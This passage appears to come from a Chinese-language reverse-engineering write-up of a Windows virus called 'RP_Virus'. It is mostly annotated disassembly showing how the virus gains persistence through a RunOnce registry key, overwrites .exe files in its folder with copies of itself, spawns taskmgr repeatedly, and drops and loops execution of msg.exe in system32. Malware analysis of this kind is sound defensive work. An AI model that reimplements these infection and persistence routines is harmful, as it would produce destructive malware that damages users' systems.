+00401798  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |||||
+0040179D  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||||
+004017A0  |.  E8 0B0E0000       call    <jmp.&msvcrt.fclose>                       ; ||||\fclose
+004017A5  |.  C74424 04 A082400>mov     dword ptr ss:[esp+4], 004082A0             ; ||||ASCII "wb"
+004017AD  |.  C70424 50924000   mov     dword ptr ss:[esp], 00409250               ; |||||
+004017B4  |.  E8 370E0000       call    <jmp.&msvcrt.fopen>                        ; ||||\fopen
+004017B9  |.  A3 AC954000       mov     dword ptr ds:[4095AC], eax                 ; ||||
+004017BE  |.  A1 AC954000       mov     eax, dword ptr ds:[4095AC]                 ; ||||
+004017C3  |.  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; ||||
+004017C7  |.  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; ||||
+004017CF  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; ||||
+004017D5  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; ||||
+004017D9  |.  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; ||||
+004017DE  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||||
+004017E1  |.  E8 BA0D0000       call    <jmp.&msvcrt.fwrite>                       ; |||\fwrite
+004017E6  |.  A1 AC954000       mov     eax, dword ptr ds:[4095AC]                 ; |||
+004017EB  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||
+004017EE  |.  E8 BD0D0000       call    <jmp.&msvcrt.fclose>                       ; ||\fclose
+004017F3  |.  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; ||
+004017F8  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||
+004017FB  |.  E8 900D0000       call    <jmp.&msvcrt.free>                         ; |\free
+```
+
+#### 将 `C:\WINDOWS\RP_Virus.exe` 设置为自启动
+
+```asm
+000401800  |.  C74424 10 A495400>mov     dword ptr ss:[esp+10], 004095A4            ; |
+00401808  |.  C74424 0C 0200000>mov     dword ptr ss:[esp+C], 2                    ; |Access = KEY_SET_VALUE
+00401810  |.  C74424 08 0000000>mov     dword ptr ss:[esp+8], 0                    ; |
+00401818  |.  C74424 04 B482400>mov     dword ptr ss:[esp+4], 004082B4             ; |ASCII "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
+00401820  |.  C70424 02000080   mov     dword ptr ss:[esp], 80000002               ; |hKey = HKEY_LOCAL_MACHINE
+00401827  |.  E8 640F0000       call    <jmp.&ADVAPI32.RegOpenKeyExA>              ; \RegOpenKeyExA
+0040182C  |.  83EC 14           sub     esp, 14
+0040182F  |.  C74424 14 0401000>mov     dword ptr ss:[esp+14], 104                 ; |
+00401837  |.  C74424 10 5092400>mov     dword ptr ss:[esp+10], 00409250            ; |ASCII "C:\WINDOWS\RP_Virus.exe"
+0040183F  |.  C74424 0C 0100000>mov     dword ptr ss:[esp+C], 1                    ; |
+00401847  |.  C74424 08 0000000>mov     dword ptr ss:[esp+8], 0                    ; |
+0040184F  |.  C74424 04 E882400>mov     dword ptr ss:[esp+4], 004082E8             ; |ASCII "RP-Virus(New Random Payloder Virus)"
+00401857  |.  A1 A4954000       mov     eax, dword ptr ds:[4095A4]                 ; |
+0040185C  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+0040185F  |.  E8 3C0F0000       call    <jmp.&ADVAPI32.RegSetValueExA>             ; \RegSetValueExA
+00401864  |.  83EC 18           sub     esp, 18
+00401867  |.  A1 A4954000       mov     eax, dword ptr ds:[4095A4]                 ; |
+0040186C  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+0040186F  |.  E8 3C0F0000       call    <jmp.&ADVAPI32.RegCloseKey>                ; \RegCloseKey
+00401874  |.  83EC 04           sub     esp, 4
+```
+
+### 计算值如果等于 15：在病毒所在目录下查找 exe 文件，如果找不到则自动创建
+
+```asm
+00401877  |>  837D 08 0F        cmp     dword ptr ss:[ebp+8], 0F                   ; |
+0040187B  |.  0F85 32010000     jnz     004019B3                                   ; |
+00401881  |.  C74424 08 0401000>mov     dword ptr ss:[esp+8], 104                  ; |
+00401889  |.  C74424 04 1090400>mov     dword ptr ss:[esp+4], 00409010             ; |
+00401891  |.  A1 A0954000       mov     eax, dword ptr ds:[4095A0]                 ; |
+00401896  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+00401899  |.  E8 420E0000       call    <jmp.&KERNEL32.GetModuleFileNameA>         ; \GetModuleFileNameA
+0040189E  |.  83EC 0C           sub     esp, 0C
+004018A1  |.  C74424 04 9D82400>mov     dword ptr ss:[esp+4], 0040829D             ; ||||||ASCII "rb"
+004018A9  |.  C70424 10904000   mov     dword ptr ss:[esp], 00409010               ; ||||||path = "C:\Documents and Settings\Administrator\桌面\3399.__86f"
+004018B0  |.  E8 3B0D0000       call    <jmp.&msvcrt.fopen>                        ; |||||\fopen
+004018B5  |.  A3 A8954000       mov     dword ptr ds:[4095A8], eax                 ; |||||
+004018BA  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |||||
+004018BF  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||||
+004018C2  |.  E8 190D0000       call    <jmp.&msvcrt.ftell>                        ; ||||\ftell
+004018C7  |.  8985 B4FEFFFF     mov     dword ptr ss:[ebp-14C], eax                ; ||||
+004018CD  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; ||||
+004018D3  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||||
+004018D6  |.  E8 F50C0000       call    <jmp.&msvcrt.malloc>                       ; |||\malloc
+004018DB  |.  A3 94954000       mov     dword ptr ds:[409594], eax                 ; |||
+004018E0  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |||
+004018E5  |.  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; |||
+004018E9  |.  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; |||
+004018F1  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; |||
+004018F7  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; |||
+004018FB  |.  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; |||
+00401900  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||
+00401903  |.  E8 B80C0000       call    <jmp.&msvcrt.fread>                        ; ||\fread
+00401908  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; ||
+0040190D  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||
+00401910  |.  E8 9B0C0000       call    <jmp.&msvcrt.fclose>                       ; |\fclose
+00401915  |.  8D85 B8FEFFFF     lea     eax, dword ptr ss:[ebp-148]                ; |
+0040191B  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; |
+0040191F  |.  C70424 0C834000   mov     dword ptr ss:[esp], 0040830C               ; |ASCII "*.exe"
+00401926  |.  E8 750D0000       call    <jmp.&KERNEL32.FindFirstFileA>             ; \FindFirstFileA
+0040192B  |.  83EC 08           sub     esp, 8
+0040192E  |.  A3 9C954000       mov     dword ptr ds:[40959C], eax
+00401933  |>  8D85 B8FEFFFF     /lea     eax, dword ptr ss:[ebp-148]               ; |
+00401939  |.  894424 04         |mov     dword ptr ss:[esp+4], eax                 ; |
+0040193D  |.  A1 9C954000       |mov     eax, dword ptr ds:[40959C]                ; |
+00401942  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+00401945  |.  E8 660D0000       |call    <jmp.&KERNEL32.FindNextFileA>             ; \FindNextFileA
+0040194A  |.  83EC 08           |sub     esp, 8
+0040194D  |.  85C0              |test    eax, eax                                  ; |||
+0040194F  |.  74 55             |je      short 004019A6                            ; |||
+00401951  |.  C74424 04 A082400>|mov     dword ptr ss:[esp+4], 004082A0            ; |||ASCII "wb"
+00401959  |.  8D85 B8FEFFFF     |lea     eax, dword ptr ss:[ebp-148]               ; |||
+0040195F  |.  83C0 2C           |add     eax, 2C                                   ; |||
+00401962  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |||
+00401965  |.  E8 860C0000       |call    <jmp.&msvcrt.fopen>                       ; ||\fopen
+0040196A  |.  A3 A8954000       |mov     dword ptr ds:[4095A8], eax                ; ||
+0040196F  |.  A1 A8954000       |mov     eax, dword ptr ds:[4095A8]                ; ||
+00401974  |.  894424 0C         |mov     dword ptr ss:[esp+C], eax                 ; ||
+00401978  |.  C74424 08 0100000>|mov     dword ptr ss:[esp+8], 1                   ; ||
+00401980  |.  8B85 B4FEFFFF     |mov     eax, dword ptr ss:[ebp-14C]               ; ||
+00401986  |.  894424 04         |mov     dword ptr ss:[esp+4], eax                 ; ||
+0040198A  |.  A1 94954000       |mov     eax, dword ptr ds:[409594]                ; ||
+0040198F  |.  890424            |mov     dword ptr ss:[esp], eax                   ; ||
+00401992  |.  E8 090C0000       |call    <jmp.&msvcrt.fwrite>                      ; |\fwrite
+00401997  |.  A1 A8954000       |mov     eax, dword ptr ds:[4095A8]                ; |
+0040199C  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+0040199F  |.  E8 0C0C0000       |call    <jmp.&msvcrt.fclose>                      ; \fclose
+004019A4  |.^ EB 8D             \jmp     short 00401933
+004019A6  |>  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; |
+004019AB  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+004019AE  |.  E8 DD0B0000       call    <jmp.&msvcrt.free>                         ; \free
+```
+
+### 计算值如果等于 16：运行 `taskmgr.exe`
+
+```asm
+004019B3  |>  837D 08 10        cmp     dword ptr ss:[ebp+8], 10                   ; |
+004019B7  |.  0F85 37010000     jnz     00401AF4                                   ; |
+004019BD  |.  C74424 08 0401000>mov     dword ptr ss:[esp+8], 104                  ; |
+004019C5  |.  C74424 04 1090400>mov     dword ptr ss:[esp+4], 00409010             ; |
+004019CD  |.  A1 A0954000       mov     eax, dword ptr ds:[4095A0]                 ; |
+004019D2  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+004019D5  |.  E8 060D0000       call    <jmp.&KERNEL32.GetModuleFileNameA>         ; \GetModuleFileNameA
+004019DA  |.  83EC 0C           sub     esp, 0C
+```
+
+#### 获取文件长度
+
+```asm
+004019DD  |.  C74424 04 9D82400>mov     dword ptr ss:[esp+4], 0040829D             ; |||||ASCII "rb"
+004019E5  |.  C70424 10904000   mov     dword ptr ss:[esp], 00409010               ; |||||
+004019EC  |.  E8 FF0B0000       call    <jmp.&msvcrt.fopen>                        ; ||||\fopen
+004019F1  |.  A3 A8954000       mov     dword ptr ds:[4095A8], eax                 ; ||||
+004019F6  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; ||||
+004019FB  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||||
+004019FE  |.  E8 DD0B0000       call    <jmp.&msvcrt.ftell>                        ; |||\ftell用于得到文件位置指针当前位置相对于文件首的偏移字节数
+00401A03  |.  8985 B4FEFFFF     mov     dword ptr ss:[ebp-14C], eax                ; |||
+00401A09  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; |||
+00401A0F  |.  890424            mov     dword ptr ss:[esp], eax                    ; |||
+00401A12  |.  E8 B90B0000       call    <jmp.&msvcrt.malloc>                       ; ||\malloc
+00401A17  |.  A3 94954000       mov     dword ptr ds:[409594], eax                 ; ||
+00401A1C  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; ||
+00401A21  |.  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; ||
+00401A25  |.  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; ||
+00401A2D  |.  8B85 B4FEFFFF     mov     eax, dword ptr ss:[ebp-14C]                ; ||
+00401A33  |.  894424 04         mov     dword ptr ss:[esp+4], eax                  ; ||
+00401A37  |.  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; ||
+00401A3C  |.  890424            mov     dword ptr ss:[esp], eax                    ; ||
+00401A3F  |.  E8 7C0B0000       call    <jmp.&msvcrt.fread>                        ; |\fread
+00401A44  |.  A1 A8954000       mov     eax, dword ptr ds:[4095A8]                 ; |
+00401A49  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+00401A4C  |.  E8 5F0B0000       call    <jmp.&msvcrt.fclose>                       ; \fclose
+00401A51  |.  C705 B0954000 000>mov     dword ptr ds:[4095B0], 0
+00401A5B  |>  A1 B0954000       /mov     eax, dword ptr ds:[4095B0]                ; ||||
+00401A60  |.  833C85 00744000 0>|cmp     dword ptr ds:[eax*4+407400], 0            ; ||||
+00401A68  |.  74 7D             |je      short 00401AE7                            ; ||||
+00401A6A  |.  C74424 04 1283400>|mov     dword ptr ss:[esp+4], 00408312            ; ||||ASCII "RP_Virus.exe"
+00401A72  |.  A1 B0954000       |mov     eax, dword ptr ds:[4095B0]                ; ||||
+00401A77  |.  8B0485 00744000   |mov     eax, dword ptr ds:[eax*4+407400]          ; ||||
+00401A7E  |.  890424            |mov     dword ptr ss:[esp], eax                   ; ||||
+00401A81  |.  E8 FA0A0000       |call    <jmp.&msvcrt.strcat>                      ; |||\strcat
+00401A86  |.  C74424 04 A082400>|mov     dword ptr ss:[esp+4], 004082A0            ; |||ASCII "wb"
+00401A8E  |.  A1 B0954000       |mov     eax, dword ptr ds:[4095B0]                ; |||
+00401A93  |.  8B0485 00744000   |mov     eax, dword ptr ds:[eax*4+407400]          ; |||
+00401A9A  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |||
+00401A9D  |.  E8 4E0B0000       |call    <jmp.&msvcrt.fopen>                       ; ||\fopen
+00401AA2  |.  A3 AC954000       |mov     dword ptr ds:[4095AC], eax                ; ||
+00401AA7  |.  A1 AC954000       |mov     eax, dword ptr ds:[4095AC]                ; ||
+00401AAC  |.  894424 0C         |mov     dword ptr ss:[esp+C], eax                 ; ||
+00401AB0  |.  C74424 08 0100000>|mov     dword ptr ss:[esp+8], 1                   ; ||
+00401AB8  |.  8B85 B4FEFFFF     |mov     eax, dword ptr ss:[ebp-14C]               ; ||
+00401ABE  |.  894424 04         |mov     dword ptr ss:[esp+4], eax                 ; ||
+00401AC2  |.  A1 94954000       |mov     eax, dword ptr ds:[409594]                ; ||
+00401AC7  |.  890424            |mov     dword ptr ss:[esp], eax                   ; ||
+00401ACA  |.  E8 D10A0000       |call    <jmp.&msvcrt.fwrite>                      ; |\fwrite
+00401ACF  |.  A1 AC954000       |mov     eax, dword ptr ds:[4095AC]                ; |
+00401AD4  |.  890424            |mov     dword ptr ss:[esp], eax                   ; |
+00401AD7  |.  E8 D40A0000       |call    <jmp.&msvcrt.fclose>                      ; \fclose
+00401ADC  |.  FF05 B0954000     |inc     dword ptr ds:[4095B0]
+00401AE2  |.^ E9 74FFFFFF       \jmp     00401A5B
+00401AE7  |>  A1 94954000       mov     eax, dword ptr ds:[409594]                 ; |
+00401AEC  |.  890424            mov     dword ptr ss:[esp], eax                    ; |
+00401AEF  |.  E8 9C0A0000       call    <jmp.&msvcrt.free>                         ; \free
+```
+
+### 计算值如果等于 17：运行 `taskmgr.exe`，打开任务管理器
+
+```asm
+00401AF4  |>  837D 08 11        cmp     dword ptr ss:[ebp+8], 11
+00401AF8  |.  75 52             jnz     short 00401B4C
+00401AFA  |.  C705 B0954000 640>mov     dword ptr ds:[4095B0], 64
+00401B04  |>  833D B0954000 00  /cmp     dword ptr ds:[4095B0], 0                  ; |
+00401B0B  |.  7E 3F             |jle     short 00401B4C                            ; |
+00401B0D  |.  C74424 14 0000000>|mov     dword ptr ss:[esp+14], 0                  ; |
+00401B15  |.  C74424 10 0000000>|mov     dword ptr ss:[esp+10], 0                  ; |
+00401B1D  |.  C74424 0C 0000000>|mov     dword ptr ss:[esp+C], 0                   ; |
+00401B25  |.  C74424 08 6B82400>|mov     dword ptr ss:[esp+8], 0040826B            ; |ASCII "taskmgr.exe"
+00401B2D  |.  C74424 04 0000000>|mov     dword ptr ss:[esp+4], 0                   ; |
+00401B35  |.  C70424 00000000   |mov     dword ptr ss:[esp], 0                     ; |
+00401B3C  |.  E8 7F0C0000       |call    <jmp.&SHELL32.ShellExecuteA>              ; \ShellExecuteA
+00401B41  |.  83EC 18           |sub     esp, 18
+00401B44  |.  FF0D B0954000     |dec     dword ptr ds:[4095B0]
+00401B4A  |.^ EB B8             \jmp     short 00401B04
+```
+
+### 计算值如果等于 18：鸣警报
+
+```asm
+00401B4C  |>  837D 08 12        cmp     dword ptr ss:[ebp+8], 12                   ; |
+00401B50  |.  75 17             jnz     short 00401B69                             ; |
+00401B52  |.  C74424 04 4006000>mov     dword ptr ss:[esp+4], 640                  ; |
+00401B5A  |.  C70424 D0070000   mov     dword ptr ss:[esp], 7D0                    ; |
+00401B61  |.  E8 2A0B0000       call    <jmp.&KERNEL32.Beep>                       ; \Beep
+00401B66  |.  83EC 08           sub     esp, 8
+```
+
+### 计算值如果等于 18：鸣警报（此段代码比较的上限为 0x13）
+
+```asm
+00401B69  |>  837D 08 13        cmp     dword ptr ss:[ebp+8], 13                   ; |
+00401B6D  |.  75 17             jnz     short 00401B86                             ; |
+00401B6F  |.  C74424 04 0807000>mov     dword ptr ss:[esp+4], 708                  ; |
+00401B77  |.  C70424 98080000   mov     dword ptr ss:[esp], 898                    ; |
+00401B7E  |.  E8 0D0B0000       call    <jmp.&KERNEL32.Beep>                       ; \Beep
+00401B83  |.  83EC 08           sub     esp, 8
+00401B86  |>  C9                leave
+00401B87  \.  C3                retn
+```
+
+## 线程2：创建并执行 `msg.exe`
+
+创建 `C:\WINDOWS\system32\msg.sys` 和 `C:\WINDOWS\system32\msg.exe`，并执行 `msg.exe`，弹出 `You are infected with RP_Virus !` 对话框提示信息。
+
+### 创建 `C:\WINDOWS\system32\msg.sys` 文件，写入 `You are infected with RP_Virus !` 信息
+
+```asm
+00401BFE   .  C74424 04 0401000>mov     dword ptr ss:[esp+4], 104                  ; |
+00401C06   .  C70424 70934000   mov     dword ptr ss:[esp], 00409370               ; |ASCII "C:\WINDOWS\system32\msg.sys"
+00401C0D   .  E8 EE0A0000       call    <jmp.&KERNEL32.GetSystemDirectoryA>        ; \GetSystemDirectoryA
+00401C12   .  83EC 08           sub     esp, 8
+00401C15   .  C74424 04 1F83400>mov     dword ptr ss:[esp+4], 0040831F             ; |||||ASCII "\msg.sys"
+00401C1D   .  C70424 70934000   mov     dword ptr ss:[esp], 00409370               ; |||||ASCII "C:\WINDOWS\system32\msg.sys"
+00401C24   .  E8 57090000       call    <jmp.&msvcrt.strcat>                       ; ||||\strcat
+00401C29   .  C74424 04 2883400>mov     dword ptr ss:[esp+4], 00408328             ; ||||
+00401C31   .  C70424 70934000   mov     dword ptr ss:[esp], 00409370               ; ||||ASCII "C:\WINDOWS\system32\msg.sys"
+00401C38   .  E8 B3090000       call    <jmp.&msvcrt.fopen>                        ; |||\fopen
+00401C3D   .  A3 AC954000       mov     dword ptr ds:[4095AC], eax                 ; |||
+00401C42   .  A1 AC954000       mov     eax, dword ptr ds:[4095AC]                 ; |||
+00401C47   .  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; |||
+00401C4B   .  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; |||
+00401C53   .  C74424 04 0401000>mov     dword ptr ss:[esp+4], 104                  ; |||
+00401C5B   .  C70424 2C834000   mov     dword ptr ss:[esp], 0040832C               ; |||ASCII "You are infected with RP_Virus !"
+00401C62   .  E8 39090000       call    <jmp.&msvcrt.fwrite>                       ; ||\fwrite
+00401C67   .  A1 AC954000       mov     eax, dword ptr ds:[4095AC]                 ; ||
+00401C6C   .  890424            mov     dword ptr ss:[esp], eax                    ; ||
+00401C6F   .  E8 3C090000       call    <jmp.&msvcrt.fclose>                       ; |\fclose
+```
+
+### 创建 `C:\WINDOWS\system32\msg.exe` 并执行
+
+```asm
+00401C74   .  C74424 04 0401000>mov     dword ptr ss:[esp+4], 104                  ; |
+00401C7C   .  C70424 90944000   mov     dword ptr ss:[esp], 00409490               ; |ASCII "C:\WINDOWS\system32"
+00401C83   .  E8 780A0000       call    <jmp.&KERNEL32.GetSystemDirectoryA>        ; \GetSystemDirectoryA
+00401C88   .  83EC 08           sub     esp, 8
+00401C8B   .  C74424 04 4D83400>mov     dword ptr ss:[esp+4], 0040834D             ; |ASCII "\msg.exe"
+00401C93   .  C70424 90944000   mov     dword ptr ss:[esp], 00409490               ; |ASCII "C:\WINDOWS\system32\msg.exe"
+00401C9A   .  E8 E1080000       call    <jmp.&msvcrt.strcat>                       ; \strcat
+00401C9F   >  C70424 E0930400   mov     dword ptr ss:[esp], 493E0                  ; |300s
+00401CA6   .  E8 250A0000       call    <jmp.&KERNEL32.Sleep>                      ; \Sleep等待300s
+00401CAB   .  83EC 04           sub     esp, 4
+00401CAE   .  C74424 04 A082400>mov     dword ptr ss:[esp+4], 004082A0             ; ||||ASCII "wb"
+00401CB6   .  C70424 90944000   mov     dword ptr ss:[esp], 00409490               ; ||||ASCII "C:\WINDOWS\system32\msg.exe"
+00401CBD   .  E8 2E090000       call    <jmp.&msvcrt.fopen>                        ; |||\fopen
+00401CC2   .  A3 AC954000       mov     dword ptr ds:[4095AC], eax                 ; |||
+00401CC7   .  A1 AC954000       mov     eax, dword ptr ds:[4095AC]                 ; |||
+00401CCC   .  894424 0C         mov     dword ptr ss:[esp+C], eax                  ; |||
+00401CD0   .  C74424 08 0100000>mov     dword ptr ss:[esp+8], 1                    ; |||
+00401CD8   .  C74424 04 6743000>mov     dword ptr ss:[esp+4], 4367                 ; |||
+00401CE0   .  C70424 00304000   mov     dword ptr ss:[esp], 00403000               ; |||
+00401CE7   .  E8 B4080000       call    <jmp.&msvcrt.fwrite>                       ; ||\fwrite
+00401CEC   .  A1 AC954000       mov     eax, dword ptr ds:[4095AC]                 ; ||
+00401CF1   .  890424            mov     dword ptr ss:[esp], eax                    ; ||
+00401CF4   .  E8 B7080000       call    <jmp.&msvcrt.fclose>                       ; |\fclose
+00401CF9   .  C74424 14 0500000>mov     dword ptr ss:[esp+14], 5                   ; |
+00401D01   .  C74424 10 0000000>mov     dword ptr ss:[esp+10], 0                   ; |
+00401D09   .  C74424 0C 0000000>mov     dword ptr ss:[esp+C], 0                    ; |
+00401D11   .  C74424 08 9094400>mov     dword ptr ss:[esp+8], 00409490             ; |ASCII "C:\WINDOWS\system32\msg.exe"
+00401D19   .  C74424 04 0000000>mov     dword ptr ss:[esp+4], 0                    ; |
+00401D21   .  C70424 00000000   mov     dword ptr ss:[esp], 0                      ; |
+00401D28   .  E8 930A0000       call    <jmp.&SHELL32.ShellExecuteA>               ; \ShellExecuteA
+00401D2D   .  83EC 18           sub     esp, 18
+00401D30   .^ E9 6AFFFFFF       jmp     00401C9F
+```
+
